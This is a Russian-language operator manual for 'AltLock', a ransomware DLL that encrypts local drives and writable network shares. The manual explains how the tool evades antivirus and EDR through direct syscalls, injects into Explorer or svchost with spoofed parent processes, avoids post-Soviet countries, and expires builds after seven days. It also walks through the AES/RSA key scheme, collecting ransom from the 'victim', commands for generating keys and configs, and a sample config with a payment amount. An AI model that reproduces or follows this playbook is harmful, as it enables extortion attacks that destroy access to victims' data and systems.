# AltLock (Находится в доработке, методичке будет дополняться).
#### Краткое описание:
Представляет из себя DLL библиотеку, которая производит шифровку всех дисков и разшаренных общедоступных сетевых каталогов, которые имеют права на чтение и запись.

Запуск производится c диска, либо через рефлективную загрузку в память и вызов функции точки входа.  
Рефлективная загрузка производится инструментами пользователя.
* `RtlFunction` - Имя функции меняется при каждом билде, во избежании детекта по функции.
* `rundll32.exe AltLock.dll RtlFunction` - Запуск с диска.
* `Inject Memory DLL & Run RtlFunction` - Запуск через инъекцию.

#### Функционал:
* Все функции имеют собственную реализацию и производят прямые вызовы в ядро.
    * Все прямые вызовы считываются с диска в обход `AV & EDR`.
    * WinApi - практически не используются и используются лишь в тех случаях, когда не существует `Native` реализации функции.
* Версия `x86` имеет в себе 2 реализации `(x86/x64)`, если обнаружен Wow64, то в `x86` загружается библиотека `x64`, которая использует прямые системные вызовы в обход `AV & EDR`.
* Игнорирование определенных файлов и каталогов, имена которых заданы в конфигурации.
* Не повышает свои привелигии.
* Не производит никаких обращений в глобальную сеть.
* Не дропает никаких лишних файлов и собственных модулей на диск.
* Внедрение в `Explorer` через захват потока.
    * Если не удалось внедриться в `Explorer`, то создается новый процесс `WerFault.exe`.
    * Если библиотека запущена в процессе, который уже имеет права `Admin`, то производится внедрение в существующий системный процесc `Svchost.exe`, если не удалось, то создается новый системный процесc `Svchost.exe`.
    * При каждом внедрении учитывается родитеская цепочка, процесс не имеет подозрительного родителя.

#### Ограничения:
* Работает начиная с `Windows Vista`.
* Не работает в странах постсоветского пространства.
* Срок годности сборки ограничен временной меткой, которая составляет `7 дней`, после достижения временной метки, сборка прекращает свою работу, после чего нужно делать новый билд.

#### Шифровка:
* Шифровка файлов производится в многопоточном режиме, алгоритмом `AES-256` с солью.
* Ключ `AES-256`, шифруется приватный ключом `RSA-4096`.
* Приватный ключ `RSA-4096`, создается каждый раз при запуске.
* Приватный ключ `RSA-4096`, шифруется публичным ключом `RSA-4096` пользователя, который был указан в конфигурации, а затем сбрасывается на диск рядом с каждым зашифрованным файлом.
* Каждый зашифрованный файл, не может быть повторно зашифрован, так же каждый не зашифрованый файл не может быть разшифрован.
* Имя зашифрованного файла, может как угодно меняться, но при дешифровке будет восстановлено исходное название файла.
* В каждом зашифрованном файле, содержится хеш сумма файла, которая сверяется при дешифровке, если файл поврежден хоть на один байт, то дешифровка не будет произведена.

#### Дешифровка:
* Потерпевший передает пользователю свой зашифрованный приватный ключ `RSA-4096`, после чего пользователь разшифровывает его своим приватным ключом `RSA-4096` и выдает разшифрованный приватный ключ `RSA-4096` потерпевшему.
* Пользователь никогда не дает никому свой приватный ключ `RSA-4096`, публичная версия которого была указанна в конфигурации.
* Потерпевший может иметь на руках дешифровщик, но он будет бесполезен без приватного ключа, который находится у него на руках в зашифрованном виде.

#### Конфигурация:
Создать приватный ключ можно с помощью файла `rsa.py`.
Перед использованием скриптов установите `Python v3` и его зависимые модули:
* `py -3 -m pip install pycryptodome`
---
Производит создание приватного и публичного ключа  `(rsa.private.pem/rsa.public.pem) `
* `py -3 rsa.py --CreateKey`
---
Производит создание приватного и публичного ключа  `(rsa.private.pem/rsa.public.pem)` и выводит хеш `Sha3` публичного ключа.
* `py -3 rsa.py --CreateKey --GetPubKeySha3`
---
Производит загрузку приватного ключа, а затем создает из него публичный ключ.
* `py -3 rsa.py --PrivKey rsa.public.pem --CreatePubKey`
---
Производит загрузку приватного ключа, а затем создает из него публичный ключ и выводит хеш `Sha3` публичного ключа.
* `py -3 rsa.py --PrivKey rsa.public.pem --CreatePubKey --GetPubKeySha3`
---
Создать конфигурацию можно с помощью файла `creconfig.py`.
* `py -3 creconfig.py --FilePublicKey rsa.public.pem --FileMessage message.txt`
---
* `--FilePublicKey` - файл публичного ключа.
* `--FileMessage` - файл с сообщением для потерпевшего.
* `--CreateUserId` -  определяет нужно ли создавать уникальный идентификатор для потерпевшего.
* `--DefaultSumMoney` - опеределяет минимальную сумму для оплаты.

Пример созданной конфигурации:
```json
{
  "Ignore": {
    "Files": [
      "dll",
      "exe",
      "com",
      "lib",
      "ini",
      "lnk",
      "msi",
      "msu"
    ],
    "Directory": [
      "Program Files",
      "Program Files (x86)"
    ]
  },
  "UserId": "7ae164401bb40dd5855ca00f81ed8d02edf481974fe3493ad093db296e6dd7fb",
  "DefaultSumMoney": 50000,
  "Message": "VGVzdCBNZXNzYWdl",
  "PublicKey": "LS0tLS1CRUdJTiBSU0EgUFVCTElDIEtFWS0tLS0tDQpNSUlDSWpBTkJna3Foa2lHOXcwQkFRRUZBQU9DQWc4QU1JSUNDZ0tDQWdFQXRXNzk2WExQNmo3c2F4VHpTYTBlDQpaTWNVTjNuU3VlWlRNUUhkbjJycUo2OWxqNG9TcURxQjEwY0hTRytTNDlBVG5SUzNPcXhmdjlXaEpNcnRaSGJaDQpFellPbFFOamlsVnhjdWlOdzYvWkE3NHhjYmFYQjkzTUI1Mlo0dmMxUXRLWDY0cXBQL0FWT3VYSUdjZXlJNkoyDQpQU1Q1dE5pYU9vYjNBUGVBN2t4TjlNYlJza1dHWS9JK2VWYW11cExLdEtsdm90OEFQVm9BRU54WHRjWk9qUmpvDQpPU2xGK3FFQ3Q2YjFxd2FGalBxcnF1anpFNi8zampXMkpwY3ZOcEkwRE9FN3ZSSmk1RG1ZcVFpZ1ZYOUdTMUp2DQpsaURwVm5HV0piNzlBM1pDVVF1ZGF4THROR0l2bFhVMWZRdTZ0ellENmkrSUR5cDN0emJTV0d2aFpnRjE3Vk5xDQpNTUJYcGpieGhBbitramZxL3l0RmMwSC9VZ3I2a1dGc000dzU2QnNkWkJoS3U4OUd2Y3htVUhvQ2JtUlQ5dGg5DQo3S01pdUZiL2xkdzZocE1DVzRiSXZLRU9Xd2g4YTRuTitzbkk1WEdiVUZVM0ZnWndLaDRxVVZYVzhQbjd0ZktCDQp5R0QyZUdWVXdqQ01RZGt2WXFTdEJiR01JVTV4UUo1dEpOV3p6d1JWbXRJQTNBdnBCbEtlakMyWURISy9OSU9nDQpxVHIzOC9QNGdzRDBEcTB3UzVZV3p3VnJJN2NTQTdDN0xpOGlXeEFvSWUyaFk3VGozYTJOQWtVYk1QTitXNG1WDQoxdHk0ck9mMUdXRmtvMGhJVTNHSlpkSkdwRzZHbDlEMmMxdTZkay9HMjFtMytqZ2pCek5lRjNyTEtUZzFhclE3DQpUM3c3akgzS2FKVlQ4VjhTRzlUL2d2RUNBd0VBQVE9PQ0KLS0tLS1FTkQgUlNBIFBVQkxJQyBLRVktLS0tLQ0K"
}
```

После создания конфигурации, передаете её человеку на билд


